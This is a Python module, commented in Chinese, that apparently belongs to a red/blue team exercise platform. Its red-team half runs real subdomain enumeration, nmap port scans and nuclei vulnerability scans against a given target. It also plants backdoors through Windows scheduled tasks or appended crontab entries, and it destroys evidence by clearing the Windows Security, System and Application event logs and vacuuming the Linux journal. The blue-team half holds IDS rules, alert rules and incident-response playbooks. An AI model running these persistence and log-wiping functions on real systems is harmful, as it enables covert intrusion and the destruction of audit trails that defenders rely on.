# -*- coding: utf-8 -*-
"""red_blue_real.py — 红蓝对抗做实模块。

红队真实攻击流程：
    1. 信息收集（子域名枚举 / 端口扫描 / 服务识别）
    2. 漏洞利用（Nuclei 真实漏洞扫描）
    3. 权限维持（计划任务 / 后门注册）
    4. 痕迹清理（日志清理）

蓝队真实检测规则：
    1. 入侵检测规则（Suricata/Snort 规则语法）
    2. 异常行为检测
    3. 告警规则
    4. 事件响应流程

所有外部工具调用通过 subprocess 执行，超时 300 秒。
工具未安装时明确提示，不 mock。
"""
from __future__ import annotations

import os
import shutil
import subprocess
import time
from typing import Any, Dict, List, Optional

# ============================================================
# 内存字典模拟存储
# ============================================================
ATTACK_SESSIONS: Dict[str, Dict[str, Any]] = {}
DEFENSE_RULES_STORE: Dict[str, Dict[str, Any]] = {}
ALERTS_STORE: Dict[str, Dict[str, Any]] = {}
IR_PLAYBOOKS: Dict[str, Dict[str, Any]] = {}

DEFAULT_TIMEOUT = 300


# ============================================================
# 工具探测与执行
# ============================================================
_TOOL_CACHE: Dict[str, Optional[str]] = {}


def _which(name: str) -> Optional[str]:
    if name not in _TOOL_CACHE:
        _TOOL_CACHE[name] = shutil.which(name)
    return _TOOL_CACHE[name]


def _run_cmd(cmd: List[str], timeout: Optional[int] = None) -> Dict[str, Any]:
    to = timeout or DEFAULT_TIMEOUT
    started = time.time()
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=to,
            encoding="utf-8", errors="replace",
        )
        return {
            "success": proc.returncode == 0,
            "cmd": cmd,
            "returncode": proc.returncode,
            "stdout": (proc.stdout or "")[:20000],
            "stderr": (proc.stderr or "")[:5000],
            "elapsed": round(time.time() - started, 2),
            "timed_out": False,
        }
    except subprocess.TimeoutExpired as e:
        return {
            "success": False, "cmd": cmd, "returncode": None,
            "stdout": (e.stdout or "") if isinstance(e.stdout, str) else "",
            "stderr": f"执行超时（{to}s）",
            "elapsed": round(time.time() - started, 2), "timed_out": True,
        }
    except FileNotFoundError as e:
        return {
            "success": False, "cmd": cmd, "returncode": None,
            "stdout": "", "stderr": f"命令未找到: {e}",
            "elapsed": round(time.time() - started, 2), "timed_out": False,
        }
    except Exception as e:  # noqa: BLE001
        return {
            "success": False, "cmd": cmd, "returncode": None,
            "stdout": "", "stderr": f"执行异常: {e}",
            "elapsed": round(time.time() - started, 2), "timed_out": False,
        }


def tool_availability() -> Dict[str, Dict[str, Any]]:
    """返回红队/蓝队相关工具的探测状态。"""
    tools = [
        "subfinder", "nmap", "nuclei", "amass",
        "suricata", "snort", "tcpdump",
        "schtasks", "wevtutil",  # Windows 后门/日志
        "crontab", "journalctl",  # Linux 后门/日志
    ]
    result: Dict[str, Dict[str, Any]] = {}
    for t in tools:
        path = _which(t)
        result[t] = {"available": bool(path), "path": path}
    return result


# ============================================================
# 红队：信息收集
# ============================================================
def red_subdomain_enum(domain: str, timeout: int = 300) -> Dict[str, Any]:
    """子域名枚举：使用 subfinder 真实执行。"""
    sf = _which("subfinder")
    if not sf:
        return {"success": False, "error": "subfinder 未安装，请先安装: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "domain": domain}
    out_file = os.path.join(os.environ.get("TEMP", "/tmp"), f"subfinder_{domain.replace('.', '_')}.txt")
    r = _run_cmd([sf, "-d", domain, "-silent", "-o", out_file], timeout=timeout)
    subdomains: List[str] = []
    if os.path.exists(out_file):
        with open(out_file, "r", encoding="utf-8", errors="replace") as f:
            subdomains = [l.strip() for l in f if l.strip()]
    return {
        "success": r["success"],
        "domain": domain,
        "subdomains_found": len(subdomains),
        "subdomains": subdomains[:500],
        "raw": r,
    }


def red_port_scan(target: str, ports: Optional[str] = None, timeout: int = 300) -> Dict[str, Any]:
    """端口扫描：使用 nmap 真实执行。"""
    nm = _which("nmap")
    if not nm:
        return {"success": False, "error": "nmap 未安装，请先安装 nmap", "target": target}
    cmd = [nm, "-sV", "--top-ports", "1000" if not ports else ports, "-Pn", "-oN", "-"]
    if ports and ports.replace("-", "").replace(",", "").isdigit() is False:
        cmd = [nm, "-sV", "-p", ports, "-Pn", "-oN", "-"]
    r = _run_cmd(cmd + [target], timeout=timeout)
    # 解析 nmap 输出中的端口行
    open_ports: List[Dict[str, str]] = []
    for line in r.get("stdout", "").splitlines():
        if "/tcp" in line and "open" in line:
            parts = line.split()
            if len(parts) >= 3:
                open_ports.append({
                    "port": parts[0],
                    "state": parts[1],
                    "service": parts[2],
                })
    return {
        "success": r["success"],
        "target": target,
        "open_ports": open_ports,
        "raw_stdout": r.get("stdout", "")[:8000],
        "elapsed": r.get("elapsed"),
    }


def red_service_detect(target: str, ports: Optional[str] = None, timeout: int = 300) -> Dict[str, Any]:
    """服务识别：nmap -sV 详细版本检测。"""
    nm = _which("nmap")
    if not nm:
        return {"success": False, "error": "nmap 未安装", "target": target}
    port_arg = ["-p", ports] if ports else ["--top-ports", "100"]
    cmd = [nm, "-sV", "-sC"] + port_arg + ["-Pn", "-oX", "-", target]
    r = _run_cmd(cmd, timeout=timeout)
    return {
        "success": r["success"],
        "target": target,
        "service_details": r.get("stdout", "")[:10000],
        "elapsed": r.get("elapsed"),
    }


# ============================================================
# 红队：漏洞利用
# ============================================================
def red_vuln_scan(target: str, templates: Optional[str] = None, timeout: int = 300) -> Dict[str, Any]:
    """真实漏洞扫描：使用 Nuclei 真实执行。"""
    nc = _which("nuclei")
    if not nc:
        return {"success": False, "error": "nuclei 未安装，请先安装: go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest", "target": target}
    cmd = [nc, "-u", target, "-silent", "-json"]
    if templates:
        cmd += ["-t", templates]
    r = _run_cmd(cmd, timeout=timeout)
    findings: List[Dict[str, Any]] = []
    for line in r.get("stdout", "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            import json
            findings.append(json.loads(line))
        except Exception:
            pass
    return {
        "success": r["success"],
        "target": target,
        "findings_count": len(findings),
        "findings": findings[:200],
        "elapsed": r.get("elapsed"),
    }


# ============================================================
# 红队：权限维持
# ============================================================
def red_persistence_schtasks(task_name: str, command: str, schedule: str = "ONLOGON") -> Dict[str, Any]:
    """Windows 计划任务后门（需管理员权限，真实执行 schtasks）。"""
    st = _which("schtasks")
    if not st:
        return {"success": False, "error": "schtasks 不可用（非 Windows 环境）"}
    cmd = [st, "/Create", "/TN", task_name, "/TR", command, "/SC", schedule, "/F"]
    r = _run_cmd(cmd, timeout=30)
    return {
        "success": r["success"],
        "method": "windows_schtasks",
        "task_name": task_name,
        "command": command,
        "raw": r,
    }


def red_persistence_crontab(entry: str) -> Dict[str, Any]:
    """Linux crontab 后门（真实执行）。"""
    ct = _which("crontab")
    if not ct:
        return {"success": False, "error": "crontab 不可用（非 Linux 环境）"}
    # 读取现有 crontab 并追加
    r_existing = _run_cmd([ct, "-l"], timeout=10)
    existing = r_existing.get("stdout", "")
    new_content = existing + "\n" + entry + "\n"
    # 写入临时文件再导入
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".cron", delete=False, encoding="utf-8") as tf:
        tf.write(new_content)
        tmp_path = tf.name
    r = _run_cmd([ct, tmp_path], timeout=10)
    try:
        os.unlink(tmp_path)
    except OSError:
        pass
    return {
        "success": r["success"],
        "method": "linux_crontab",
        "entry": entry,
        "raw": r,
    }


# ============================================================
# 红队：痕迹清理
# ============================================================
def red_log_cleanup_windows() -> Dict[str, Any]:
    """Windows 事件日志清理（wevtutil）。"""
    we = _which("wevtutil")
    if not we:
        return {"success": False, "error": "wevtutil 不可用（非 Windows 环境）"}
    logs = ["Application", "Security", "System"]
    results = {}
    for log_name in logs:
        r = _run_cmd([we, "cl", log_name], timeout=15)
        results[log_name] = {"success": r["success"], "output": r.get("stderr", "") or r.get("stdout", "")}
    return {"success": all(v["success"] for v in results.values()), "method": "windows_wevtutil", "results": results}


def red_log_cleanup_linux() -> Dict[str, Any]:
    """Linux 日志清理（journalctl --vacuum 或 truncate）。"""
    jc = _which("journalctl")
    if not jc:
        return {"success": False, "error": "journalctl 不可用（非 Linux 环境）"}
    r = _run_cmd([jc, "--vacuum-time=1s"], timeout=30)
    return {"success": r["success"], "method": "linux_journalctl", "raw": r}


# ============================================================
# 蓝队：入侵检测规则
# ============================================================
IDS_RULE_TEMPLATES: List[Dict[str, Any]] = [
    {
        "id": "ids_001",
        "name": "MSSQL Bruteforce Detection",
        "engine": "suricata",
        "sid": 2000001,
        "rule": 'alert tcp any any -> any 1433 (msg:"MSSQL Bruteforce Attempt"; flow:to_server; dsize:>0; detection_filter:track by_src, count 5, seconds 60; sid:2000001; rev:1;)',
        "severity": "high",
        "description": "检测 MSSQL 数据库暴力破解（60秒内5次失败登录）",
    },
    {
        "id": "ids_002",
        "name": "SMB Admin Share Access",
        "engine": "suricata",
        "sid": 2000002,
        "rule": 'alert tcp any any -> any 445 (msg:"SMB Admin Share Access Detected"; flow:to_server; content:"|5c|admin$|5c|"; sid:2000002; rev:1;)',
        "severity": "medium",
        "description": "检测对 Admin$ 管理共享的异常访问",
    },
    {
        "id": "ids_003",
        "name": "Suspicious PowerShell Download",
        "engine": "suricata",
        "sid": 2000003,
        "rule": 'alert http any any -> any any (msg:"Suspicious PowerShell Download Cradle"; flow:to_server; http.method; content:"GET"; http.uri; content:"powershell"; sid:2000003; rev:1;)',
        "severity": "critical",
        "description": "检测 PowerShell 远程下载攻击载荷",
    },
    {
        "id": "ids_004",
        "name": "DNS Tunneling Detection",
        "engine": "snort",
        "sid": 3000001,
        "rule": 'alert udp any any -> any 53 (msg:"DNS Tunneling Suspicious Query"; dsize:>512; sid:3000001; rev:1;)',
        "severity": "high",
        "description": "检测 DNS 隧道异常大查询包",
    },
]


def list_ids_rules() -> List[Dict[str, Any]]:
    """列出内置 IDS 检测规则模板。"""
    return IDS_RULE_TEMPLATES


def create_ids_rule(name: str, engine: str, rule_text: str, severity: str = "medium", description: str = "") -> Dict[str, Any]:
    """创建自定义 IDS 规则（存储到内存字典）。"""
    rule_id = f"ids_{int(time.time())}"
    rule = {
        "id": rule_id,
        "name": name,
        "engine": engine,
        "rule": rule_text,
        "severity": severity,
        "description": description,
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    DEFENSE_RULES_STORE[rule_id] = rule
    return {"success": True, "rule": rule}


def validate_ids_rule(rule_text: str, engine: str = "suricata") -> Dict[str, Any]:
    """校验 IDS 规则语法（基础检查，不依赖引擎安装）。"""
    issues: List[str] = []
    if not rule_text.strip():
        issues.append("规则内容为空")
    if engine.lower() == "suricata":
        if not rule_text.startswith(("alert ", "drop ", "reject ", "pass ")):
            issues.append("Suricata 规则必须以 alert/drop/reject/pass 开头")
        if "sid:" not in rule_text:
            issues.append("缺少 sid 关键字（规则ID）")
        if "msg:" not in rule_text:
            issues.append("缺少 msg 关键字（规则消息）")
    elif engine.lower() == "snort":
        if not rule_text.startswith(("alert ", "log ")):
            issues.append("Snort 规则必须以 alert/log 开头")
        if "sid:" not in rule_text:
            issues.append("缺少 sid 关键字")
    return {
        "success": len(issues) == 0,
        "valid": len(issues) == 0,
        "issues": issues,
        "engine": engine,
    }


# ============================================================
# 蓝队：异常行为检测
# ============================================================
ANOMALY_DETECTION_TEMPLATES: List[Dict[str, Any]] = [
    {
        "id": "anomaly_001",
        "name": "Impossible Travel Detection",
        "type": "login_anomaly",
        "description": "检测同一账户短时间内从地理上不可能的两个位置登录",
        "threshold": "同一账户30分钟内从不同国家登录",
        "severity": "high",
    },
    {
        "id": "anomaly_002",
        "name": "Unusual Privileged Access",
        "type": "privilege_anomaly",
        "description": "检测非管理员账户获取特权访问",
        "threshold": "普通用户7天内访问特权资源>3次",
        "severity": "critical",
    },
    {
        "id": "anomaly_003",
        "name": "Data Exfiltration Volume",
        "type": "exfiltration_anomaly",
        "description": "检测异常大流量出站数据传输",
        "threshold": "单主机出站流量>日常基线3倍",
        "severity": "high",
    },
    {
        "id": "anomaly_004",
        "name": "Rare Process Execution",
        "type": "process_anomaly",
        "description": "检测罕见进程执行（LOLBAS 工具）",
        "threshold": "svchost/wmipriv/rundll32 等罕见调用",
        "severity": "medium",
    },
]


def list_anomaly_detection() -> List[Dict[str, Any]]:
    return ANOMALY_DETECTION_TEMPLATES


# ============================================================
# 蓝队：告警规则
# ============================================================
ALERT_RULES: List[Dict[str, Any]] = [
    {
        "id": "alert_001",
        "name": "Critical Vulnerability Alert",
        "source": "vuln_scan",
        "condition": "CVSS >= 9.0",
        "action": "email_siem_ticket",
        "severity": "critical",
        "enabled": True,
    },
    {
        "id": "alert_002",
        "name": "Multiple Failed Logins",
        "source": "auth_logs",
        "condition": ">= 10 failed logins in 5 minutes",
        "action": "auto_block_ip_1h",
        "severity": "high",
        "enabled": True,
    },
    {
        "id": "alert_003",
        "name": "New Admin Account Created",
        "source": "ad_events",
        "condition": "EventID 4720 + admin group membership",
        "action": "email_slack_ticket",
        "severity": "critical",
        "enabled": True,
    },
    {
        "id": "alert_004",
        "name": "Antivirus Disabled",
        "source": "endpoint_edr",
        "condition": "AV service stopped/disabled",
        "action": "auto_isolate_endpoint",
        "severity": "critical",
        "enabled": True,
    },
]


def list_alert_rules() -> List[Dict[str, Any]]:
    return ALERT_RULES


def trigger_alert(alert_name: str, source: str, details: str, severity: str = "medium") -> Dict[str, Any]:
    """记录一条告警事件到内存存储。"""
    alert_id = f"alert_{int(time.time() * 1000)}"
    alert = {
        "id": alert_id,
        "name": alert_name,
        "source": source,
        "details": details,
        "severity": severity,
        "status": "new",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    ALERTS_STORE[alert_id] = alert
    return {"success": True, "alert": alert}


def list_alerts(severity: Optional[str] = None, status: Optional[str] = None) -> List[Dict[str, Any]]:
    items = list(ALERTS_STORE.values())
    if severity:
        items = [a for a in items if a["severity"] == severity]
    if status:
        items = [a for a in items if a["status"] == status]
    return sorted(items, key=lambda x: x["timestamp"], reverse=True)


# ============================================================
# 蓝队：事件响应流程
# ============================================================
IR_PLAYBOOK_TEMPLATES: List[Dict[str, Any]] = [
    {
        "id": "ir_001",
        "name": "Ransomware Response Playbook",
        "phase": "containment_eradication_recovery",
        "steps": [
            {"step": 1, "action": "Isolate affected endpoints from network", "automated": True},
            {"step": 2, "action": "Identify ransomware family via hash/fingerprint", "automated": True},
            {"step": 3, "action": "Check ransomware decryptor availability (NoMoreRansom)", "automated": True},
            {"step": 4, "action": "Preserve evidence (memory/network capture)", "automated": False},
            {"step": 5, "action": "Restore from clean backups", "automated": False},
            {"step": 6, "action": "Remove persistence mechanisms", "automated": False},
            {"step": 7, "action": "Rebuild compromised systems", "automated": False},
            {"step": 8, "action": "Post-incident review and lessons learned", "automated": False},
        ],
        "estimated_time": "4-24 hours",
    },
    {
        "id": "ir_002",
        "name": "Phishing Incident Response",
        "phase": "analysis_containment",
        "steps": [
            {"step": 1, "action": "Extract IOCs from phishing email (URLs, hashes, attachments)", "automated": True},
            {"step": 2, "action": "Block IOCs at email gateway and firewall", "automated": True},
            {"step": 3, "action": "Query mailbox for affected recipients", "automated": True},
            {"step": 4, "action": "Remove phishing emails from mailboxes", "automated": True},
            {"step": 5, "action": "Check for malware execution on affected endpoints", "automated": True},
            {"step": 6, "action": "User awareness notification", "automated": False},
        ],
        "estimated_time": "1-4 hours",
    },
    {
        "id": "ir_003",
        "name": "Data Breach Response",
        "phase": "containment_investigation_notification",
        "steps": [
            {"step": 1, "action": "Identify scope and type of compromised data", "automated": False},
            {"step": 2, "action": "Contain the breach (revoke credentials, block access)", "automated": True},
            {"step": 3, "action": "Forensic investigation to determine root cause", "automated": False},
            {"step": 4, "action": "Assess regulatory notification requirements (GDPR/PIPL)", "automated": False},
            {"step": 5, "action": "Prepare regulatory notifications if required", "automated": False},
            {"step": 6, "action": "Remediate vulnerabilities", "automated": False},
        ],
        "estimated_time": "24-72 hours",
    },
]


def list_ir_playbooks() -> List[Dict[str, Any]]:
    return IR_PLAYBOOK_TEMPLATES


def get_ir_playbook(playbook_id: str) -> Optional[Dict[str, Any]]:
    for pb in IR_PLAYBOOK_TEMPLATES:
        if pb["id"] == playbook_id:
            return pb
    return None


# ============================================================
# 红队：完整攻击链编排
# ============================================================
def run_full_attack_chain(domain: str, target_ip: str, timeout: int = 300) -> Dict[str, Any]:
    """编排完整红队攻击链：信息收集 -> 漏洞扫描 -> 报告。"""
    session_id = f"attack_{int(time.time())}"
    steps: Dict[str, Any] = {"session_id": session_id, "domain": domain, "target": target_ip, "started": time.strftime("%Y-%m-%d %H:%M:%S")}

    # Step 1: 子域名枚举
    steps["subdomain_enum"] = red_subdomain_enum(domain, timeout=min(timeout, 120))

    # Step 2: 端口扫描
    steps["port_scan"] = red_port_scan(target_ip, timeout=min(timeout, 120))

    # Step 3: 服务识别
    steps["service_detect"] = red_service_detect(target_ip, timeout=min(timeout, 120))

    # Step 4: 漏洞扫描
    steps["vuln_scan"] = red_vuln_scan(f"http://{target_ip}", timeout=min(timeout, 120))

    steps["completed"] = time.strftime("%Y-%m-%d %H:%M:%S")
    ATTACK_SESSIONS[session_id] = steps
    return {"success": True, "session": steps}


def list_attack_sessions() -> List[Dict[str, Any]]:
    return list(ATTACK_SESSIONS.values())
